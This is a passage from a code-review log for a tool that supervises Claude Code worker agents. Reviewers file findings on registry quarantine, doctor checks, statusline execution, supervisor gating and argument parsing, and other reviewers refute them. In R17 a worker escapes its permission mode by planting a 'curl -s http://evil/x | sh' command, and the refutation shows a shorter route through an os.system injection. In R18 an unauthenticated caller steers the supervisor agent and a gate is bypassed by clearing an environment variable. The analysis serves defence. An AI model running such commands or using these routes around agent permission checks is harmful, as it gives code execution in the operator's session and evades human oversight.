The caller was told `corrupt registry quarantined to ...T233021Z`, while `state/fleet.json` is still corrupt on disk and the named artifact holds a *different* registry.

Scenario B (measured, rename raising `PermissionError(32)` — the WinError 5/32 sharing violation that `_replace_with_retry` at bin/fleet.py:812-864 exists precisely because it happens on this box when another process has the registry open):
```
ROW: [FAIL] registry: registry was corrupt and has been quarantined -- corrupt registry quarantined to ...\state\fleet.json.corrupt.2026-07-27T232926Z
registry still present: True
artifacts: []
```

Scenario C (POSIX branch): the same same-second collision silently overwrites the first artifact, so the registry that held the live worker records is gone with no error anywhere.

**Refuted because:**

- *(confidence: high)* The severe half of the finding (same-second name collision -> POSIX silently overwrites the earlier artifact / Windows FileExistsError) is unreachable. A second _quarantine_registry call requires state/fleet.json to exist AND be corrupt again: after a successful quarantine the file is gone and load_registry (bin/fleet.py:744-745) returns {"workers": {}}; save_registry (bin/fleet.py:867-883) is atomic (mkstemp + json.dump of a dict + _replace_with_retry, with unlink-and-reraise on any pre-replace failure), so no fleet path can recreate a CORRUPT registry; and an AST walk shows every quarantining call site (cmd_spawn, cmd_send, cmd_kill, cmd_clean, cmd_archive, _sweep_husks, _expire_tombstones, cmd_doctor's `if repair:` arm at :9080-9082) sits lexically inside `with fleet_lock():`, so concurrent processes are serialized and the loser sees a missing file rather than racing the rename. Even at cmd_wait's two unlocked loads, a lost race yields FileNotFoundError on the SOURCE -- POSIX rename cannot clobber the earlier artifact when the source is gone. The finding's "measured" Scenario A hand-recreated the corrupt file between the two calls; nothing in the codebase does that.  The premise "every consumer treats the return value as an accomplished fact" is also false for the load-bearing consumers. All five refusal readers enumerated in the _quarantine_artifacts docstring (bin/fleet.py:644-696) -- _sweep_husks, _doctor_check_autoclean, _require_claim_holder's §9 arm, _acting_worker_identity, _identity_abstention_note -- go through _quarantine_artifacts() (:697-700), a live glob of state/. That is truth-from-disk, so a swallowed rename failure cannot poison any guard. Nothing reads the registry_corrupt event back to locate the artifact (:638 is the only writer; the only readers are two tests).  A failed rename is the conservative direction, not a hazard: the dangerous transition documented at :9056-9058 is corrupt->absent ("the §9 legacy-claim upgrade abstains on corrupt but is granted on absent"). If the rename fails, the registry stays corrupt under its own name, every downstream reader keeps refusing, and the caller still raises RegistryCorruptError and exits 1. No data loss, no invariant broken, no guard bypassed.  What survives is only a message-accuracy defect on a narrow race (concurrent open of fleet.json on win32 causing ERROR_SHARING_VIOLATION), which the docstring at :629-631 declares as intentional best-effort, and whose worst outcome is an operator told "quarantined" while the still-corrupt file sits at the path named in the same message.

---

### R16 — `fleet doctor` never FAILS on a quarantine artifact and calls an absent registry "readable"

- `bin/fleet.py:9037`  |  claimed **medium**  |  dimension `registry-corruption`

**Claim:** State: operator ran `fleet doctor --repair`; `state/fleet.json` was renamed to `state/fleet.json.corrupt.<ts>`, taking every live worker record with it. Operator runs `fleet doctor` to confirm the fix.

Measured:
```
ROW: [PASS] registry: ...\state\fleet.json is readable
ROW: [PASS] autoclean: no run recorded yet ... ; quarantine artifact present (fleet.json.corrupt.2026-07-27T233021Z) -- husk sweep is refusing itself (NEW-1); ...
registry exists: False
```

The registry row states a nonexistent file is readable (identical text to a fresh install, so the two states are indistinguishable at that row), and on an otherwise-healthy machine every row is PASS, so doctor exits 0 — while `_sweep_husks` is refusing itself, the §9 upgrade arm is refusing, and every worker record lives only in the artifact.

**Refuted because:**

- *(confidence: medium)* Every mechanical claim reproduces — I measured it in a scratch home (registry absent + artifact present): REG ROW = ('registry', True, '...state\fleet.json is readable'), AUTO ROW = ('autoclean', True, '... quarantine artifact present (fleet.json.corrupt.20260727T233021Z) -- husk sweep is refusing itself (NEW-1); restore the quarantined data, then remove the artifact'). The path is reachable (bin/fleet.py:9080-9095 -> load_registry quarantines under --repair; the next run hits read_registry_no_repair's missing-file contract at :791-792). So it is not unreachable — but it is not a defect either, on three grounds.  1. THE NEVER-FAIL BEHAVIOUR IS RATIFIED AND TEST-PINNED, not an oversight. docs/specs/autoclean.md:83 (D4) declares the autoclean check note-only, and its 2026-07-27 amendment states "Still note-only in every arm, per the same doctrine and per the 2026-07-27 lesson that a permanently-red doctor is a disabled doctor". tests/test_autoclean.py:653-660 (test_quarantine_artifact_surfaced) asserts exactly the state the finding calls a bug: "_, ok, msg = fleet._doctor_check_autoclean(); assert ok  # still note-only; assert 'quarantine artifact' in msg". The proposed fix turns that test red. Note-only-with-an-actionable-note is also the convention, not an anomaly: mailboxes (:8140), stale-attaches (:8148), limited-parks (:8174), legacy-mix (:8188), orphaned-claims (:8264) and tzdata (:8613) are ok=True on every return, with an explicit anti-cry-wolf rationale at :8526-8539.  2. THE CLAIMED HARM ("indistinguishable", "reads green") is false for doctor's actual output. The same run prints the artifact filename and its remedy verbatim, and commands/doctor.md consumes the TEXT ("For each reported problem, give the one command that fixes it"), not the exit code. The operator is told, by name, on the same screen.  3. THE CITED CONTRADICTION ISN'T ONE. _quarantine_artifacts' docstring splits readers into RULE 1 (presence-only: is state/ carrying an unresolved incident) and RULE 2 (is this ABSENCE a fresh install or an incident). It lists _doctor_check_autoclean under RULE 1 — surface the artifact — which is precisely what it does. RULE 2 (bin/fleet.py:679-693) is explicitly assigned to _acting_worker_identity (:2292) and _identity_abstention_note (:12396); the doctor registry row is never claimed as a RULE 2 reader.  No wrong ACTION follows from the PASS: every downstream consequence of a lingering artifact fails safe and announces itself at the point of use — _sweep_husks refuses with its own message (:7647-7653) and the §9 legacy-claim arm abstains naming `fleet doctor --repair` (:12669). The residue is one loose word on a row plus an exit code with no programmatic consumer; no crash, race, data loss, or silent-failure path.
- *(confidence: high)* The reviewer's reading of the control flow is factually accurate (bin/fleet.py:9036-9037 PASSes on an absent registry; _doctor_check_autoclean returns ok=True at 8588/8592/8597; cmd_doctor exits 0 if all_ok), but the behavior is deliberate, documented, and pinned — not a defect. (1) The doctrine comment at bin/fleet.py:7876-7883 enumerates the note-only checks by name (including "autoclean scheduler state") and states the rule: they "always return ok=True -- it can inform, never turn doctor red. Only genuinely broken infrastructure ... counts as a hard failure." (2) docs/specs/autoclean.md:94 re-affirms it AFTER the same 2026-07-27 gate the finding cites: "Still note-only in every arm ... a permanently-red doctor is a disabled doctor." (3) The proposed fix (return ok=False) would break a currently-green pin, tests/test_autoclean.py:653-660 test_quarantine_artifact_surfaced, which asserts `assert ok  # still note-only`; I ran `py -3.13 -m pytest -q tests/test_autoclean.py -k "quarantine or stamp_errors"` -> 6 passed. (4) The "silently indistinguishable" harm claim is contradicted by the finding's own measured transcript: the autoclean row names the artifact by filename and prints the remedy on the same screen, so doctor is not silent. The docstring's RULE 2 (bin/fleet.py:679-693) deliberately assigns the absent-fresh-vs-absent-incident distinction to _acting_worker_identity and _identity_abstention_note, not to doctor's registry row. (5) The operator IS paged at the moment the state is created: bin/fleet.py:9038-9040 returns ok=False ("registry was corrupt and has been quarantined") on the --repair run itself, so the transition into the state exits nonzero. Only residual is the imprecise "is readable" wording for an absent file — a cosmetic message nit, not the ok=False change the finding argues for.

---

### R17 — Statusline executes an unvalidated command string from state/ with shell=True on every refresh

- `bin/fleet_statusline.py:295`  |  claimed **medium**  |  dimension `subprocess-security`

**Claim:** A worker is dispatched into the fleet repo under a NON-bypass mode (`--mode accept` -> acceptEdits, or `dontask`), which is precisely the configuration chosen to stop an agent from running arbitrary commands: file edits auto-accept, Bash still prompts. The worker writes one file inside its own cwd — `state/statusline-chain.json` containing `{"delegates":[{"command":"curl -s http://evil/x | sh"}]}` — with no prompt, because it is an ordinary in-tree edit. Within seconds the operator's own Claude Code session refreshes its statusline, `bin/fleet_statusline.py` loads that file and runs the string through `subprocess.run(..., shell=True)`. The command executes in the operator's session, with the operator's environment, repeatedly, and its output is discarded on nonzero exit so nothing is ever shown. The permission mode that was supposed to keep the worker out of a shell is bypassed by a file write — the same escalation class the destructive-command guard at bin/fleet.py:3494-3512 exists to prevent.

**Refuted because:**

- *(confidence: high)* The code path is real and reachable exactly as described: bin/fleet_statusline.py:278-311 reads state/statusline-chain.json with no ownership, signature, or provenance check and passes each delegates[].command to subprocess.run(shell=True) on every statusline refresh; bin/fleet.py:3483-3492 is a writer that stores any string; tests/test_terminal_surface.py:1393-1443 demonstrate a hand-written chain file being executed. So the mechanics are not in dispute.  What is refuted is the security claim — that a file write escalates a non-bypass worker into an operator-session shell it was denied. The statusLine that _install_statusline writes into ~/.claude/settings.json is `<python> <FLEET_HOME>/bin/fleet_statusline.py` (bin/fleet.py:3641 `script = statusline_script_path().resolve().as_posix()`, 3667-3671). That target script is an in-tree file in the exact directory the finding assumes the attacker can write. Under the finding's own scenario (worker dispatched with `--mode accept` and cwd = FLEET_HOME), the worker can edit bin/fleet_statusline.py itself — or bin/fleet.py, which the operator runs on every `fleet status` — and obtain arbitrary Python execution in the operator's session on the identical trigger (next statusline refresh), with strictly more power and without touching state/ at all.  I checked whether anything upstream narrows the worker's write surface to exclude bin/: worker-settings.template.json contains only `hooks` — there is no `permissions` block and no `deny` rule anywhere in the repo (only .claude/settings.local.json, which is the operator's own bypassPermissions config). Dispatch adds `--add-dir tasks_dir()` / `--add-dir journals_dir()` (bin/fleet.py:9712-9713) to *widen* access; it does not restrict the worker's own cwd tree. So a worker in FLEET_HOME is already inside fleet's TCB.  Consequently the chain file grants no privilege the attacker does not already hold, and the proposed HMAC-over-command fix would be defeated by editing the verifying code in the same tree. The real (already-accepted) boundary is "do not dispatch a writing worker into FLEET_HOME", not "the statusline trusts state/".  One sub-observation is true but non-defective on its own: delegates run whenever the file merely exists, even if the operator never passed `--chain` — _load_delegates does no "did fleet install this" check. That only matters to an attacker who can already write bin/, which is game over regardless.
- *(confidence: high)* The reviewer's mechanical reading is accurate: `bin/fleet_statusline.py:290-305` does run `_load_delegates()`'s string through `subprocess.run(..., shell=True)` with no validation, and `_capture_statusline_delegate` (bin/fleet.py:3483-3492) writes whatever string it is handed. Where the finding fails is the claimed escalation — the fix would close nothing, because the attack it describes has a strictly shorter, equally unprompted path through the very script doing the executing.  `_install_statusline` (bin/fleet.py:3620-3675) writes into the operator's `~/.claude/settings.json`:      settings["statusLine"] = {         "type": "command",         "command": f"{Path(sys.executable).resolve().as_posix()} {script}",  where `script = statusline_script_path().resolve().as_posix()` and `statusline_script_path()` is `FLEET_HOME / "bin" / "fleet_statusline.py"` (bin/fleet.py:312-313). So the operator's interactive session executes a file **inside the fleet repo tree** on every refresh. `bin/fleet_statusline.py` is a git-tracked, ordinary in-tree file (`git ls-files bin/` confirms).  Apply the finding's own scenario: a worker dispatched into FLEET_HOME under `--mode accept` (`"accept": ["--permission-mode", "acceptEdits"]`, bin/fleet.py:1315). The finding says such a worker can write `state/statusline-chain.json` with no prompt because it is an ordinary in-tree edit. The identical permission grant lets it append `import os; os.system("curl -s http://evil/x | sh")` to `bin/fleet_statusline.py` — same one file write, same absence of a Bash prompt, same operator session, same refresh interval, and it needs neither the chain file nor `shell=True`. The same holds for `bin/fleet.py` (executed by every `fleet` invocation the operator's session is granted) and `bin/hooks/*.py`.  So `state/statusline-chain.json` is not a new escalation primitive; it sits inside the same trust boundary as the executable it feeds. The proposed remedies all fail against the scenario that motivates them: an HMAC keyed outside `state/` is verified by code the attacker just rewrote; moving the chain file to the user config dir leaves `bin/fleet_statusline.py` in the worker's cwd; dropping `shell=True` for an argv list removes nothing, since the executing script is itself writable. A finding whose fix does not change the outcome of its own failure scenario is not a defect at the cited line — it is a restatement of "granting a worker edit access to a repository of executable code grants code execution."  Two secondary inaccuracies, neither load-bearing: (1) the title's "on every refresh" holds only when a chain file exists — with none, `_load_delegates` returns `[]` and zero subprocesses spawn, pinned by `tests/test_terminal_surface.py::TestStatuslineChainRender::test_chain_spawns_no_subprocess_when_unconfigured`, so the default install is untouched; (2) "its output is discarded on nonzero exit so nothing is ever shown" is inverted as a stealth argument — on exit 0 the delegate's stdout IS printed into the operator's statusline (fleet_statusline.py:303-305, 347-349), so the channel is noisier, not quieter, than claimed.

---

### R18 — Seam #1 send carve-out is documented as a mailbox append but fork-steers an IDLE holder, dispatching a session and mutating the registry

- `bin/fleet.py:12107`  |  claimed **medium**  |  dimension `supervisor-claim`

**Claim:** Measured end-to-end (scratch pytest, tmp FLEET_HOME, `dispatch_bg` stubbed). State: fresh armed claim `inc-held` (heartbeat 5s old, nonce_hash set), holder record `sup|inc-succ|successor` with session_id=HOLDER_SID and status "idle", roster lists HOLDER_SID not busy. A caller with `CLAUDE_CODE_SESSION_ID=<any other sid>` and NO `--nonce` runs `fleet send supervisor "ATTACKER TEXT: spawn ten workers"`. Result: rc 0, `dispatch_bg` was called with `resume_sid=HOLDER_SID` and the caller's text (a real `claude --bg --resume` session in production, carrying the holder's full transcript — and therefore the live generation — per the printed "fork carries full transcript (G2b)"), and the registry record was rewritten to `session_id: NEWSID00-..., retired_sids: [HOLDER_SID], status: working, turns: 1`. So a body that proved no continuity, and that the same gate refuses `spawn`/`kill`/`clean` on, can dispatch a turn on the most privileged body in the fleet and desynchronise `INCARNATION.session_id` (still the pre-fork sid) from the holder record — the ND4a lag, now attacker-triggerable rather than only supervisor-triggerable.

**Refuted because:**

- *(confidence: high)* I reproduced the reviewer's mechanism exactly (scratch pytest, tmp FLEET_HOME, `dispatch_bg` stubbed) and confirm the raw behavior: with a fresh claim held by HOLDER_SID and the holder record `sup|inc-succ|successor` genuinely idle (roster live+idle, fresh `result` outcome), a caller holding a different `CLAUDE_CODE_SESSION_ID` and no `--nonce` runs `fleet send supervisor "..."`, the carve-out at bin/fleet.py:12089-12113 disarms (it never consults status), and `_cmd_send_native`'s idle branch fork-steers: `dispatch_bg(resume_sid=HOLDER_SID, hint="ATTACKER TEXT...")`, record rewritten to `session_id: NEWSID00…, retired_sids: [HOLDER_SID], status: working, turns: 1`, `INCARNATION.session_id` still the pre-fork sid. So the control-flow read is right. But the finding's three load-bearing conclusions are wrong.  (1) NO PRIVILEGE DELTA — the "attacker-triggerable" framing is refuted by the gate itself. `_supervisor_gate` returns at bin/fleet.py:12003-12005 when `current_caller_session()` is None, and `current_caller_session()` (bin/fleet.py:888-896) is nothing but `os.environ.get("CLAUDE_CODE_SESSION_ID")`. I ran it: with the env var unset and a fresh armed claim, `_supervisor_gate` returns cleanly for `send`, `spawn`, `kill`, `clean`, `respawn` alike. The refusal message the reviewer quotes says so in its own text: "This is a SPEED-BUMP, not a security boundary: it is bypassable by anyone who can run this command without a session id." A body that can invoke `fleet send` can invoke it with one env var cleared and get `spawn`/`kill`/`clean` ungated too. The carve-out grants that body nothing it did not already have.  (2) THE PROPOSED FIX (a) WOULD BREAK THE FEATURE, not narrow it. `SUPERVISOR_CLAIM_STALE_SECONDS = 3600.0` (bin/fleet.py:9909), so "claim fresh AND holder idle" is not an edge case — it is the ordinary state of a supervisor between turns for a full hour, and it is precisely the state the interface tier sends into when handing the supervisor a task. Narrowing the disarm to a `working` verdict makes `fleet send supervisor` raise `SupervisorClaimGateError` whenever the supervisor is between turns, so no mail is even queued; and queued mail is only drained by `compose_prompt` at dispatch time, i.e. only a turn delivers it. That is a supervisor deadlock, and it re-creates the exact G-B seam ("the interface tier CANNOT steer the supervisor it just launched") that G-C's 4-0 council vote existed to remove — the council explicitly rejected the sid-stripping alternative as "an env-var ritual an unattended operator can forget." `_refetch_holder_record`'s docstring (bin/fleet.py:6141-6145), which the finding cites as evidence, actually says the opposite of what it is cited for: the IDLE holder is "the primary intended case" of a send-driven supervisor steer, and fleet's own sup-kill/sup-respawn choreography is written around that fork.  (3) THE ND4a CONSEQUENCE IS ALREADY HANDLED. The finding treats `INCARNATION.session_id` lagging the restamped record as new damage. `_record_is_supervisor_claim_holder` matches on the sid UNION (`session_id ∪ retired_sids`) and its docstring at bin/fleet.py:2049-2053 states it exists for exactly this: "after a fork-steer the claim still carries the OLD sid (pull-restamp lag) while the record was eagerly restamped … the union bridges that window (ND4a)." Every identity judgement downstream (archive exemption :7677, ceiling :14456, gate :12112) reads through that union, so the lag is bridged by design and is produced identically by a supervisor's own fork-steer.  What actually survives is much smaller than filed and points the other way: the inline comment at bin/fleet.py:12045-12046 (a verbatim quote of ratified council condition #2 in docs/AUTONOMOUS-2026-07-24.md) says the ungated path "mutates no INCARNATION/registry/claim" — true of INCARNATION and the claim, false of the registry on the idle branch — and `tests/test_steer_seams.py::TestSeam1CmdSendEndToEnd` seeds only `status="working"`. That is a comment-accuracy and coverage gap, not a medium-severity behavioral or security defect, and its fix is (b), not (a).

---

### R19 — _WRITE_RE only sees `x["retired_sids"] =`; an .append()/.update() writer is invisible to the citation pin

- `tests/test_retired_sid_citations.py:44`  |  claimed **medium**  |  dimension `tests-quality`

**Claim:** A new release/handoff path appends the RELEASER's sid onto the released record: `rec.setdefault("retired_sids", []).append(releaser_rec["session_id"])`. `_writer_line_numbers()` returns the same four lines, `test_every_retired_sids_writer_is_cited` passes (writers == cited), `test_no_writer_appends_a_foreign_sid` never examines the new line, and `test_the_citation_block_is_found_at_all` still counts 4. A foreign sid is now in `retired_sids`, which breaks the invariant that `_releaser_is_roster_live` and the §7.1 `send` carve-out (bin/fleet.py:2546) both cite by name -- `_record_sids` = session_id ∪ retired_sids then matches a session the record never owned, and ownership/liveness decisions key on it.

**Refuted because:**

- *(confidence: high)* The mechanical observation is correct -- `_WRITE_RE = re.compile(r'^\s*\S+\["retired_sids"\]\s*=')` at tests/test_retired_sid_citations.py:44 matches only the copy-then-assign form; I confirmed it misses `.append()`, `.setdefault(...).append()`, `.update({...})`, and also `+=` (a form the reviewer did not list). But that does not make it a defect today.  (1) No evasion exists in the source. `grep -n 'retired_sids"\]\s*\.\|setdefault("retired_sids"\|update({"retired_sids' bin/` returns nothing (exit 1). Every record-level write to `retired_sids` in bin/fleet.py uses the assignment form and every one is cited. The docstring claim the reviewer calls false -- "every retired_sids write in the file is cited" -- is TRUE of the current source. The remaining grep hits are the record template at bin/fleet.py:1006 ("retired_sids": [], explicitly excluded by the comment at tests/test_retired_sid_citations.py:41-44, and harmless: it initialises empty) and a LOCAL variable at bin/fleet.py:5817 (`retired_sids = [s for s in dict.fromkeys(_ordered) ...]`), which is not a write to any record's key.  (2) The test is not vacuous and not "cannot fail". `py -3.13 -m pytest -q tests/test_retired_sid_citations.py` -> 4 passed. It goes red if any of the four writers shifts a line, if a fifth assignment-form writer is added uncited, or if the citing sentence is reworded -- the last case guarded by an explicit seed test, `test_the_citation_block_is_found_at_all` (:62-70), which is precisely the receipts-style self-test the proposed fix asks to add. The vacuity failure mode is already seeded against.  (3) The reviewer misread the source they cite. They give the four writers as bin/fleet.py:5041, 5498, 9334, 14164. The actual writers -- and the actual numbers in both citing comments -- are 5043, 5500, 9336, 14166 (see bin/fleet.py:11409-11410: "every writer appends that record's OWN prior sid alone: :5043, :5500, :9336, :14166", and the §7.1 carve-out at bin/fleet.py:2542-2549). If their numbers were the real ones, `test_every_retired_sids_writer_is_cited` would already fail. They did not execute the pin against the tree they are reporting on.  (4) I checked the writer most likely to actually violate the invariant, the handoff-transfer path at bin/fleet.py:14166: `prior = succ_rec.get("session_id")` (:14164) is the successor record's OWN prior sid, so `succ_rec["retired_sids"] = list(succ_rec.get("retired_sids", [])) + [prior]` inserts nothing foreign. Same for 5043 (`+ [old_sid]`), 5440/5500 (`prior_retired + [old_sid]`), and 9336 (`+ [old_sid]`). The invariant holds in shipped code.  The failure scenario is entirely a hypothetical future edit ("A new release/handoff path appends the RELEASER's sid...") written in a spelling the codebase does not use anywhere. That is the explicitly excluded "this could be a problem if someone later..." class -- no wrong behavior, crash, race, data loss, or broken invariant exists now. Hardening the detector into an AST walk is a reasonable enhancement request, not a finding.
- *(confidence: high)* The mechanical claim is true but describes no reachable defect.  VERIFIED TRUE (mechanics): `_WRITE_RE = re.compile(r'^\s*\S+\["retired_sids"\]\s*=')` at C:\proga\claude-fleet\tests\test_retired_sid_citations.py:44 is a line-anchored subscript-assignment matcher. I re-ran the three planted spellings in scratch and confirmed `.setdefault(...).append(...)`, `rec["retired_sids"].append(...)` and `rec.update({...})` are all MISS while the assign form is SEEN.  REFUTED (reachability — the lens I was given): nothing in the shipped code produces the wrong outcome. `grep -n retired_sids bin/fleet.py` returns exactly four write sites — 5043, 5500, 9336, 14166 (the finding's 5041/5498/9334/14164 are off by two; those are the cited numbers' neighbours, the real writers are the +2 lines) — and every one of them is the copy-then-assign form, is cited at bin/fleet.py:11409-11411 and bin/fleet.py:12061-12063, and IS examined by `test_no_writer_appends_a_foreign_sid`. `py -3.13 -m pytest -q tests/test_retired_sid_citations.py` → 4 passed. There is no input, no registry state, and no execution path today that puts a foreign sid into `retired_sids`, so `_record_sids` (bin/fleet.py:1941) and the §7.1 send carve-out cannot mis-resolve one body onto another.  The finding's failure scenario is not a state the system can reach; it is a future edit that has not been made ("a new release/handoff path appends the RELEASER's sid"). That is exactly the excluded class in the review brief: speculative "this could be a problem if someone later...". Every guard in the repo is weaker than some unwritten future code; that alone is not a defect.  The docstring-overstatement angle also does not survive: the sweeping sentence at :20-21 is qualified two lines above the regex itself, at :43 — "A write to `retired_sids` -- the assignment form every writer uses." The file states its own detector scope. And the test is not vacuous/unfailable: it carries a seed check (`test_the_citation_block_is_found_at_all`, :62) and fails on line drift, on a new assignment-form writer, or on a citation pointing at a non-writer.  Residual: the AST-walk hardening in the proposed fix is a defensible robustness improvement to a guard. It is a hardening request, not a bug.

---

### R20 — _absorb_minted_flag_values eats a following FLAG as the nonce value, silently dropping --dry-run/--yes

- `bin/fleet.py:15027`  |  claimed **low**  |  dimension `cli-errors`

**Claim:** A slash-command template or shell script renders `fleet archive --nonce $NONCE --dry-run` and `$NONCE` is unset/empty (unquoted, so the token disappears). argv becomes `['archive','--nonce','--dry-run']`. `_absorb_minted_flag_values` produces `['archive','--nonce=--dry-run']`, so `args.dry_run` is False and `args.nonce` is the string `'--dry-run'`. `cmd_archive` (bin/fleet.py:7376) reads `dry_run = False` and performs a LIVE archive sweep: it stamps `archived_at`, moves journals/outcomes/task/mailbox files into `logs/archive/<name>/`, and `claude rm`s the workers' sids — when the operator explicitly asked for a preview. The same shape silently strips `--yes` from `fleet clean`/`fleet kill` (that direction fails safe, toward a refusal, but reports a confusing reason).

**Refuted because:**

- *(confidence: high)* The parser-level mechanic is real (reproduced: ['archive','--nonce','--dry-run'] -> nonce='--dry-run', dry_run=False), but the filed failure scenario is unreachable, and the finding's location is wrong (bin/fleet.py:15027 is render_shard; the code is at 16348-16366).  (1) No caller can produce the assumed argv. There is no `archive` slash command (commands/ contains attach, clean, doctor, interrupt, kill, overview, peek, release, respawn, result, resume-limited, send, spawn, status), and `grep -rn nonce commands/*.md` returns zero hits — no template presents --nonce at all. `grep` for $NONCE / ${NONCE} / `--nonce $` across the whole repo returns zero hits, so there is no shell-expansion layer for an unset variable to vanish in. Per CLAUDE.md, mutating slash commands are prompt templates, never inline !`cmd`, so nothing renders these through a shell.  (2) The single programmatic space-form rendering — the one the absorber exists for, bin/fleet.py:13627 `sup-boot --handoff-inc {successor_inc} --handoff-token {handoff_token}` — is line-TRAILING. An absent value there lands in the trailing-valueless case the docstring describes and tests/test_supervisor.py:2432 pins, giving argparse's SystemExit(2). Every other --nonce string in fleet.py (6232, 13145, 13155, 13161, 13415, 13438) is a literal `<value>`/`<YOUR-NONCE>` placeholder in operator prose, also trailing.  (3) Decisive: the destructive outcome is anti-correlated with its own trigger. cmd_archive calls `_supervisor_gate("archive", nonce=...)` at 7373, BEFORE reading dry_run at 7378. The gate arms only when the caller has CLAUDE_CODE_SESSION_ID AND a claim is held with a fresh heartbeat (11928-12036). In exactly that state — the only state where anyone has a generation to present — `_nonce_presentation(claim, "--dry-run")` returns None (12037; the function at 12283 matches only live/pending/prior slots), so the gate raises SupervisorClaimGateError at 12114 => exit 4, zero mutation, NO archive sweep. The live sweep the finding describes requires the gate DISARMED (no claim or no sid), which is precisely the state in which no operator holds a nonce and no doc instructs passing one: skills/fleet/SKILL.md:50 documents archive as `fleet archive [name] [--ttl-hours F] [--dry-run]` with no --nonce, and skills/fleet/supervisor.md:74 shows plain `fleet archive --dry-run`.  (4) The finding itself concedes the --yes/clean direction fails safe toward a refusal.  What remains is a comment-accuracy nit (the "trailing" qualifier is imprecise) plus a bare hand-typo scenario with no rendering path — not the filed defect.
- *(confidence: high)* The argv-rewrite mechanism is real and I reproduced it (`['archive','--nonce','--dry-run']` -> `['archive','--nonce=--dry-run']`, dry_run=False), but every load-bearing part of the finding fails.  (a) Wrong location: bin/fleet.py:15027 is `_INDEX_HEX`/`render_shard`, not the absorber. The real code is bin/fleet.py:16348-16366.  (b) The docstring is not false. It asserts only that "a TRAILING valueless flag is left for argparse to refuse" and says nothing about a non-trailing one — incomplete, not false. tests/test_supervisor.py:2432 (`test_a_trailing_valueless_flag_is_left_for_argparse_to_refuse`) pins exactly the case the docstring describes, so the "docs assert something the code does not do" category does not apply.  (c) The failure scenario is architecturally excluded. It requires a shell rendering `fleet archive --nonce $NONCE --dry-run` with `$NONCE` unset. bin/fleet.py:9941-9949 states the design explicitly: "§6.5 D5: `--nonce <value>` is the ONLY presentation channel. There is no `FLEET_SUP_NONCE`, and adding one would be a design error rather than a convenience" — the nonce is deliberately never carried in an env var or shell variable; it is held in the agent's context and typed literally. There is no commands/archive.md, and the project rule makes mutating slash commands prompt templates (no inline exec, hence no shell variable substitution). Grep found no script, template, or code path anywhere in the repo emitting `--nonce` before `--dry-run`. The documented recipe (skills/fleet/supervisor.md:74) is `fleet archive --dry-run`; appending `--nonce V` puts the flag TRAILING, which takes the already-safe argparse-refusal path. Only the `--nonce`-first ordering is affected.  (d) Even granting the argv, the stated consequence does not follow. `cmd_archive`'s first statement (bin/fleet.py:7373) is `_supervisor_gate("archive", nonce=getattr(args, "nonce", None))`, before any lock, file move, registry write or `claude rm`. The gate is armed exactly when a sid-bearing caller runs while a supervisor claim is held with a FRESH heartbeat — the only situation in which a caller has a nonce at all. In that state nonce='--dry-run' fails continuity and raises SupervisorClaimGateError (exit 4), archiving nothing. The claimed "LIVE archive sweep" therefore requires the gate to be DISARMED, i.e. no fresh claim held — precisely the state in which nobody holds a nonce and `--nonce` would not be on the command line. The scenario needs a caller that both has and does not have a nonce.  (e) The reviewer already concedes the `--yes` direction fails safe (toward refusal).  What remains is a permissiveness the code does not need (the absorber accepts a following option string as a value), and the proposed one-line `not nxt.startswith("--")` guard is harmless hardening — but there is no concrete reachable failure, which is what the finding bar requires.

---

### R21 — fleet clean deletes a worker's task/journal/outcome files after releasing the lock, so a same-name respawn loses its prompt

- `bin/fleet.py:6835`  |  claimed **low**  |  dimension `destructive`

**Claim:** `fleet clean` (interface tier) pops dead worker `w1` and calls `save_registry`, then releases `fleet.lock`. Before the delete loop runs, the supervisor's `fleet spawn w1 <cwd> <task>` acquires the lock, finds the name free, inserts a fresh record, and `dispatch_bg` writes the prompt body to `state/tasks/w1.md` (bin/fleet.py:9683). Clean's `_remove_worker_files("w1", old_sid)` then unlinks `state/tasks/w1.md`, `state/journals/w1.md` and `state/outcomes/w1.jsonl`. The newly launched session's entire prompt is the one line `Read <FLEET_HOME>/state/tasks/w1.md and follow it exactly.` (9689) — the file no longer exists, so the worker boots with no task at all, and its name-keyed outcome file and journal are gone too.

**Refuted because:**

- *(confidence: medium)* REACHABILITY refutes the filed scenario on two independent grounds.  (1) The window the scenario needs does not exist. In `cmd_clean` the lock exit and the first delete are consecutive statements with nothing between them — `bin/fleet.py:6832-6838`:      if changed:         save_registry(data)     for n, sid, _retired in removed:         append_event("cleaned", n, session_id=sid)      # still INSIDE the lock      for n, sid, retired in removed:                      # lock released one line earlier         _remove_worker_files(n, sid, retired_sids=retired)  There is no I/O, sleep, prompt or subprocess between the `with fleet_lock()` exit and `_remove_worker_files(w1, ...)` for the first doomed name — microseconds. The competing spawn must, inside that gap, acquire the lock, `load_registry`/`validate_name`/`save_registry`/`append_event` (3854-3870), release, run `compose_prompt` (3876), then in `dispatch_bg` do `resolve_claude_executable` (a `shutil.which` PATH scan, 9673), two `mkdir`s (9678-9684) and only then `task_path.write_text` (9686). A spawn parked in the lock queue polls at `LOCK_RETRY_INTERVAL_SECONDS = 0.05` (`bin/fleet.py:488`, loop at 507-523), so its expected re-acquire latency alone (~25 ms mean) is orders of magnitude larger than the gap. In the ordinary case the spawn acquires the lock *after* clean has already unlinked, and writes a fresh task file that nothing deletes.  (2) The precondition — a same-name spawn already queued on the lock at pop time — is one the CLI refuses in every non-racing ordering, and no automatic path produces it. `cmd_spawn` calls `validate_name(args.name, existing=data["workers"].keys())` (3856) which raises `worker name already exists` (619-620). For the spawn to be blocked on the lock at the instant clean pops, the caller must have issued `fleet spawn w1` while the dead `w1` record was still in the registry — an invocation that deterministically fails unless it wins this exact race. Nothing in the codebase reuses a name automatically: `_cmd_respawn_native` keeps the record and writes its new pre-claim *under the lock at 5486-5503, before* `dispatch_bg` (5517) writes the task file, so clean's concurrent-mutation guards (`current != before_rec`, 6769 and 6822-6827) spare it; sup-spawn names carry a unique launch id.  (3) The related, more reachable variant is also already closed: a launch-in-flight record can never be in `doomed_now`. `recompute_worker_native` (2862-2866) holds `session_id is None` at `working` until `_launch_claim_expired` (1145-1158) with `LAUNCH_CLAIM_MAX_AGE_SECONDS = 600.0` (1142). So clean can never doom a worker whose `dispatch_bg` is currently writing `state/tasks/<name>.md`; every `dead` verdict belongs to a record whose dispatch finished or expired ≥10 minutes ago.  (4) The stated impact is also overstated: at the alleged instant the new worker has no journal and no outcome file to lose (both are written later, by the worker/Stop hook), and the task text still lives in the registry record's `task` field, so `fleet respawn w1` re-composes it. The worst case is one visible failed Read, not data loss.  What remains is a theoretical, much narrower TOCTOU than the one filed: if the doomed set contains an earlier entry whose `shutil.rmtree(logs/archive/<name>/)` (6660-6683) is slow enough to stretch the post-lock loop into the 